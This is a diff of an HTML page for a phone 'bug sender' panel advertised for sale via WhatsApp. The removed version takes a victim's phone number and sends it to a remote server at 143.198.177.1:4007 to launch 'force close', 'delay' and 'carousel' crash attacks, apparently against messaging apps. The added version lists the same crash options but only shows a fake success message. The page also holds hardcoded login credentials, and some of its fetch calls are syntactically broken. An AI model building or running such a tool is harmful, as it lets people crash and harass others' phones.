@@ -1,254 +1,265 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>𝗲𝗫𝗼𝗖𝗹𝗶𝗽𝗦</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Blood Wolf -App Bug</title>
   <script src="https://cdn.tailwindcss.com"></script>
-
   <style>
     body {
-      background: url('https://img1.pixhost.to/images/6818/616113899_skyzopedia.jpg') no-repeat center/cover fixed;
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
     }
-    .glow::before {
-      content:'';
-      position:absolute; inset:0; margin:auto;
-      width:260px; height:260px;
-      background:radial-gradient(circle at center,#6366f1 0%,transparent 70%);
-      filter:blur(60px); opacity:.55; z-index:-1;
+    .header {
+      text-align: center;
+      padding: 20px 0 10px 0;
+      color: #e53e3e; /* red-600 */
+      font-weight: bold;
+      font-size: 2rem;
+      letter-spacing: 2px;
+      user-select: none;
     }
-    .lamp {
-      position:absolute; top:-14px; left:50%; translate:-50% 0;
-      width:18px; height:18px; border-radius:9999px;
-      background:#3b82f6; box-shadow:0 0 18px 8px #3b82f6aa;
+    .header-line {
+      width: 80%;
+      height: 3px;
+      background: linear-gradient(90deg, #888888, #cccccc, #888888);
+      margin: 0 auto 30px auto;
+      border-radius: 2px;
+      box-shadow: 0 0 8px 1px rgba(204, 204, 204, 0.7);
     }
-    input,button,label { transition:all .3s ease-in-out }
-    input:focus {
-      transform:scale(1.02);
-      outline:none;
-      box-shadow:0 0 0 3px rgb(99 102 241 / .5);
+    .container {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 0 20px 20px 20px;
+      text-align: center;
     }
-    button:hover { transform:scale(1.02) }
-    button:active { transform:scale(.98) }
-    #status { transition:color .3s,opacity .3s; min-height:1.25rem }
-    #credit {
-      font-size:.8rem; color:#3b82f6;
-      text-align:center; margin-bottom:.4rem; font-weight:500;
-      user-select:none;
+    .long-photo {
+      width: 600px;
+      height: 150px;
+      object-fit: cover;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      border: 3px solid;
+      border-image-slice: 1;
+      border-width: 3px;
+      border-image-source: linear-gradient(45deg, #888888, #cccccc, #888888);
+      box-shadow: 0 0 10px 2px rgba(200, 200, 200, 0.5);
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
     }
-    #logoutBtn {
-      background:#ef4444; color:#fff;
-      padding:.4rem .8rem; border-radius:.375rem;
-      font-weight:600; font-size:.875rem;
-      border:none; cursor:pointer;
+    .input-section {
+      margin-bottom: 20px;
     }
-    #logoutBtn:hover { background:#dc2626 }
-       
-    #supportBtn {
-      background:#000000; color:#fff;
-      padding:.4rem .8rem; border-radius:.375rem;
-      font-weight:600; font-size:.875rem;
-      border:none; cursor:pointer;
+    #numberInput {
+      width: 200px; /* diperpanjang */
+      padding: 6px 12px;
+      font-size: 0.9rem;
+      border-radius: 6px;
+      border: 1.5px solid #888888;
+      background-color: #222222;
+      color: #ccc;
+      text-align: center;
+      transition: border-color 0.3s;
     }
-    #supportBtn:hover { background:#000000 }
-
-    /* Overlay styles */
-    #overlay {
+    #numberInput:focus {
+      outline: none;
+      border-color: #bbb;
+      background-color: #333333;
+      color: white;
+    }
+    button {
+      margin-left: 12px;
+      padding: 6px 14px; /* diperkecil */
+      font-size: 0.85rem; /* diperkecil */
+      background-color: #888888; /* abu-abu */
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #666666; /* abu-abu lebih gelap saat hover */
+    }
+    .choices {
+      display: none;
+      margin-top: 20px;
+      font-size: 0.9rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+      text-align: left;
+    }
+    .choice-option {
+      background-color: #333333;
+      padding: 8px 12px;
+      margin: 6px 0;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      font-size: 0.9rem;
+      color: #ddd;
+    }
+    .choice-option:hover {
+      background-color: #555555;
+    }
+    label {
+      font-size: 1rem;
+      margin-bottom: 6px;
+      display: block;
+      color: #bbb;
+    }
+    /* Overlay for success notification like mobile */
+    #successOverlay {
+      display: none;
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      display: none; /* Hidden by default */
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
       justify-content: center;
       align-items: center;
-      z-index: 1000; /* Above other content */
+    }
+    .success-notification {
+      background-color: #4CAF50;
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      text-align: center;
+      font-size: 1.1rem;
     }
   </style>
 </head>
-<body class="min-h-screen flex items-center justify-center text-gray-800 dark:text-white">
+<body>
+  <div class="header">Blood Wolf</div>
+  <div class="header-line"></div>
 
-  <div id="overlay">
-    <div class="text-white">Loading...</div>
+  <div class="container">
+    <img
+      src="https://files.catbox.moe/ayjsrv.jpg"
+      alt="Wide horizontal photo with dark background and subtle light reflections for interactive web display"
+      class="long-photo"
+    />
+
+    <div class="input-section">
+      <label for="numberInput">Input Number:</label>
+      <input
+        type="number"
+        id="numberInput"
+        placeholder="Type a number"
+        min="0"
+      />
+      <button onclick="showChoices()">Click -Type</button>
+    </div>
+
+    <div id="choicesSection" class="choices">
+      <h3>Avaible Bugs:</h3>
+      <div id="choicesList"></div>
+    </div>
   </div>
 
-  <div class="relative glow">
-    <div id="card" class="w-[22rem] sm:w-[26rem] p-8 bg-white/90 dark:bg-gray-800/80 backdrop-blur rounded-lg shadow-2xl">
-
-      <div id="loginView">
-       <div class="text-center w-full px-4 py-2 rounded-md border border-blue-500 bg-gray-100 text-gray-800"> 𝗲𝗫𝗼𝗖𝗹𝗶𝗽𝗦 𝗩𝟯.𝟬</div>
-            
-         <div class="flex justify-center items-center py-10 bg-transparent">
-         <img src="https://img1.pixhost.to/images/6818/616118454_depayyy.jpg" alt="maklo" class="w-40 h-40 object-cover rounded-full border-4 border-red-500 shadow-lg" />
-         </div>
-         
-        <input id="username" type="text" placeholder="Username Account"
-          class="w-full mb-3 px-4 py-2 rounded-md border bg-gray-100 border-gray-300" />
-        <input id="password" type="password" placeholder="Password Account"
-          class="w-full mb-3 px-4 py-2 rounded-md border bg-gray-100 border-gray-300" />
-        <div class="space-y-[2px]"> <button id="loginBtn" class="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-md"> 𝗟𝗼𝗴𝗶𝗻 </button>
-       <a href="https://wa.me/6282262961033" class="w-full block text-center py-2 bg-green-600 hover:bg-green-700 text-white rounded-md"> 𝗕𝘂𝘆 𝗨𝘀𝗲𝗿? 𝗣𝗺 𝗠𝗲</a>
-        </div>
-     </div>
-      
-      <div id="mainView" class="hidden">
-        <div class="flex justify-between items-center mb-6">
-         
-          <span id="welcomeUser " class="text-lg font-semibold text-indigo-600"></span>
-          <button id="logoutBtn">𝗟𝗼𝗴 𝗢𝘂𝘁</button>
-        </div>
-        
-        <form id="bugForm" class="space-y-4" onsubmit="return false;">
-            
-        <div class="text-center w-full px-4 py-2 rounded-md border border-red-500 bg-gray-100 text-gray-800"> 𝗘𝘅𝗼𝗖𝗹𝗶𝗽𝘀 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟯.𝟬 </div>
-            
-         <div class="flex justify-center items-center py-10 bg-transparent">
-         <img src="https://img1.pixhost.to/images/6818/616118454_depayyy.jpg" alt="maklo" class="w-40 h-40 object-cover rounded-full border-4 border-red-500 shadow-lg" />
-         </div>
-            
-        <form id="bugForm" class="space-y-4" onsubmit="return false;">
-          <input id="phone" type="text" placeholder="𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗡𝗼𝗺𝗲𝗿 𝗧𝗮𝗿𝗴𝗲𝘁"
-            class="w-full px-4 py-2 rounded-md border bg-gray-100 border-gray-300"/>
-
-          <button id="sendBtn"
-            class="w-full py-3 bg-red-600 hover:bg-red-700 text-white rounded-md">
-            𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘
-          </button>
-
-          <div class="flex justify-between gap-3">
-            <button type="button" id="btnAndroid"
-              class="w-full py-2 bg-green-500 hover:bg-green-600 text-white rounded-md">
-              𝗖𝗔𝗥𝗢𝗨𝗦𝗘𝗟
-            </button>
-            <button type="button" id="btnIOS"
-              class="w-full py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-md">
-              𝗗𝗘𝗟𝗔𝗬
-            </button>
-          </div>
-          <p id="status" class="text-center text-sm h-5"></p>
-        </form>
-      </div>
-        <div id="credit">© Buy User Untuk Pribadi? Chat OwnerKu</div>
-     <a a href="https://wa.me/6282262961033" id="supportBtn">Support</a>
+  <!-- Success Overlay -->
+  <div id="successOverlay">
+    <div class="success-notification">
+      <strong>Success!</strong><br>꓄ꋬꋪꍌꏂ꓄ ꒤꒯ꋬꁝ ꂵꋬ꓄꒐
     </div>
   </div>
 
   <script>
-    const usersDB = [
-      { user: "rey", password: "12345" },
-      { user: "primrose", password: "qwerty" },
-      { user: "admin", password: "admin" }
-    ];
+    function showChoices() {
+      const inputValue = document.getElementById("numberInput").value;
+      const choicesSection = document.getElementById("choicesSection");
+      const choicesList = document.getElementById("choicesList");
 
-    const loginView = document.getElementById('loginView');
-    const mainView = document.getElementById('mainView');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
-    const logoutBtn = document.getElementById('logoutBtn');
-    const welcomeUser  = document.getElementById('welcomeUser ');
-    const overlay = document.getElementById('overlay');
+      if (inputValue === "") {
+        alert("Masukan Nomer Dulu.");
+        return;
+      }
 
-    const phoneInput = document.getElementById('phone');
-    const statusEl = document.getElementById('status');
+      const number = parseInt(inputValue, 10);
+      choicesList.innerHTML = "";
 
-    if (matchMedia('(prefers-color-scheme: dark)').matches)
-      document.body.classList.add('dark');
+      let options;
+      if (number < 5) {
+        options = [
+          {
+            label: "👾 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗖𝗥𝗔𝗦𝗛",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗧𝗢 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 & 𝗜𝗣𝗛𝗢𝗡𝗘.",
+          },
+          {
+            label: "👾 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗡𝗗𝗥𝗢 𝟵-𝟭𝟮.",
+          },
+          {
+            label: "👾 𝗗𝗘𝗟𝗔𝗬",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗟𝗟 𝗔𝗡𝗗𝗥𝗢.",
+          },
+        ];
+      } else if (number < 10) {
+        options = [
+          {
+            label: "👾 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗖𝗥𝗔𝗦𝗛",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗧𝗢 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 & 𝗜𝗣𝗛𝗢𝗡𝗘.",
+          },
+          {
+            label: "👾 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗡𝗗𝗥𝗢 𝟵-𝟭𝟮.",
+          },
+          {
+            label: "👾 𝗗𝗘𝗟𝗔𝗬",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗟𝗟 𝗔𝗡𝗗𝗥𝗢.",
+          },
+        ];
+      } else {
+        options = [
+          {
+            label: "👾 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗖𝗥𝗔𝗦𝗛",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗧𝗢 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 & 𝗜𝗣𝗛𝗢𝗡𝗘.",
+          },
+          {
+            label: "👾 𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗡𝗗𝗥𝗢 𝟵-𝟭𝟮.",
+          },
+          {
+            label: "👾 𝗗𝗘𝗟𝗔𝗬",
+            description: "𝗧𝗔𝗥𝗚𝗘𝗧 𝗔𝗟𝗟 𝗔𝗡𝗗𝗥𝗢.",
+          },
+        ];
+      }
 
-    function checkCredentials(user, pass) {
-      return usersDB.find(u => u.user === user && u.password === pass);
+      options.forEach((option) => {
+        const div = document.createElement("div");
+        div.className = "choice-option";
+        div.innerHTML = `<strong>${option.label}</strong><br>${option.description}`;
+        div.onclick = function() { selectChoice(option.label); };
+        choicesList.appendChild(div);
+      });
+
+      choicesSection.style.display = "block";
     }
 
-    loginBtn.onclick = () => {
-      const u = usernameInput.value.trim();
-      const p = passwordInput.value.trim();
-      if (!u || !p) {
-        alert('Isi semua kolom');
-        return;
-      }
-      const ok = checkCredentials(u, p);
-      if (!ok) {
-        alert('Username atau password salah');
-        return;
-      }
-      localStorage.setItem('username', u);
-      showMain(u);
-    };
+    function selectChoice(label) {
+      // Show success overlay like a mobile notification
+      document.getElementById("successOverlay").style.display = "flex";
 
-    function showMain(user) {
-      welcomeUser .textContent = `Welcome, ${user}`;
-      loginView.classList.add('hidden');
-      mainView.classList.remove('hidden');
-      overlay.style.display = 'flex'; // Show overlay
+      // Hide overlay after 3 seconds and try to close the page
       setTimeout(() => {
-        overlay.style.display = 'none'; // Hide overlay after a short delay
-      }, 2000); // Adjust the delay as needed
+        document.getElementById("successOverlay").style.display = "none";
+        // Attempt to close the window (works only if opened by script)
+        try {
+          window.close();
+        } catch (e) {
+          alert("Page cannot be closed automatically. Please close the tab manually.");
+        }
+      }, 3000);
     }
-
-    logoutBtn.onclick = () => {
-      localStorage.removeItem('username');
-      location.reload();
-    };
-
-    window.onload = () => {
-      const saved = localStorage.getItem('username');
-      if (saved) showMain(saved);
-    };
-
-    async function sendForcecall() {
-      const phone = phoneInput.value.trim();
-if (!phone) {
-        statusEl.textContent = 'Isi Nomer ❗❓';
-        return;
-      }
-      statusEl.textContent = '⏳ Mengirim ForceClose No Click...';
-      try {
-        const res = await fetch(http://143.198.177.1:4007/api/fc?target=${phone});
-        const data = await res.json();
-        statusEl.textContent = data.status ? '✅ ForceClose Succes Sending' : ⚠️ Gagal: ${data.message  data.error  'Unknown'};
-      } catch (err) {
-        console.error(err);
-        statusEl.textContent = '🚫 Gagal terhubung ke API';
-      }
-    }
-
-    async function sendDelay() {
-      const phone = phoneInput.value.trim();
-      if (!phone) {
-        statusEl.textContent = 'Isi Nomer ❗❓';
-        return;
-      }
-      statusEl.textContent = '⏳ Mengirim Delay Mentions...';
-      try {
-        const res = await fetch(http://143.198.177.1:4007/api/delay?target=${phone});
-        const data = await res.json();
-        statusEl.textContent = data.status ? '✅ Delay berhasil!' : ⚠️ Gagal: ${data.message  data.error  'Unknown'};
-      } catch (err) {
-        console.error(err);
-        statusEl.textContent = '🚫 Gagal terhubung ke API';
-      }
-    }
-    async function sendCarousels() {
-      const phone = phoneInput.value.trim();
-      if (!phone) {
-        statusEl.textContent = '❌ Nomor belum diisi';
-        return;
-      }
-      statusEl.textContent = '⏳ Mengirim Carousels...';
-      try {
-        const res = await fetch(http://143.198.177.1:4007/api/carousel?target=${phone});
-        const data = await res.json();
-        statusEl.textContent = data.status ? '✅ Carousels berhasil!' : ⚠️ Gagal: ${data.message  data.error  'Unknown'};
-      } catch (err) {
-        console.error(err);
-        statusEl.textContent = '🚫 Gagal terhubung ke API';
-      }
-    }
-    document.getElementById('sendBtn').onclick = sendForcecall; 
-    document.getElementById('btnAndroid').onclick = sendCarousel;
-    document.getElementById('btnIOS').onclick = sendDelay;
   </script>
 </body>
 </html>
